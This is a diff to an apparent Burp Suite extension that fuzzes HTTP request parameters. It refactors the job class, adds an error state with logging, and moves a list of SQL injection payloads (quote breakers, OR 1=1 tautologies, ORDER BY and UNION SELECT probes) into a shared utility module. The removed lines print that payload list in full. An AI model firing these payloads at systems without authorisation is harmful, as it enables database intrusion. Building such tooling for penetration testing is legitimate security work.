@@ -3,14 +3,14 @@ from java.net import URL
 from java.util import ArrayList;
 from threading import Lock
 from burp import IParameter
-
-PAYLOADS = ["--","'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";", "' or \"", "-- or # ", "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --", "'''''''''''''UNION SELECT '2", "%00", "/*...*/ ", "+", "||", "%", " AND 1", " AND 0", " AND true", " AND false", "1-false", "1-true", "1*56", "-2", "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+", "1' ORDER BY 1,2--+", "1' ORDER BY 1,2,3--+", "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+", "-1' UNION SELECT 1,2,3--+"]
+import Utils
 
 class FuzzJob:
     STATUS_ADDED = "added"
     STATUS_NOT_TO_START = "not_to_start"
     STATUS_STARTED = "started"
     STATUS_FINISHED = "finished"
+    STATUS_ERROR = "error"
 
     def __init__(self, extender, id1, tool, requestResponse, messageInfo, analyzedRequest):
         self._extender = extender
@@ -27,16 +27,22 @@ class FuzzJob:
             "id": 0
         })
         self._fuzLock = Lock()
-        self.initialize()
+        try:
+            self.initialize()
+        except Exception as e:
+            self._status = FuzzJob.STATUS_ERROR
+            self._extender.log(self._analyzedRequest.getUrl())
+            self._extender.log(self._analyzedRequest.getParameters())
+            self._extender.log(e, True)
     
     def initialize(self):
         self._status = FuzzJob.STATUS_STARTED
 
         #check if in scope
         for parameter in self._analyzedRequest.getParameters():
-            if parameter.getType() == IParameter.PARAM_COOKIE:
+            if not Utils.isParameterAllowed(parameter):
                 continue
-            for payload in PAYLOADS:
+            for payload in Utils.PAYLOADS:
                 if parameter.getType() == IParameter.PARAM_URL:
                     payload = parameter.getValue()+self._extender._helpers.urlEncode(payload)
                 else:
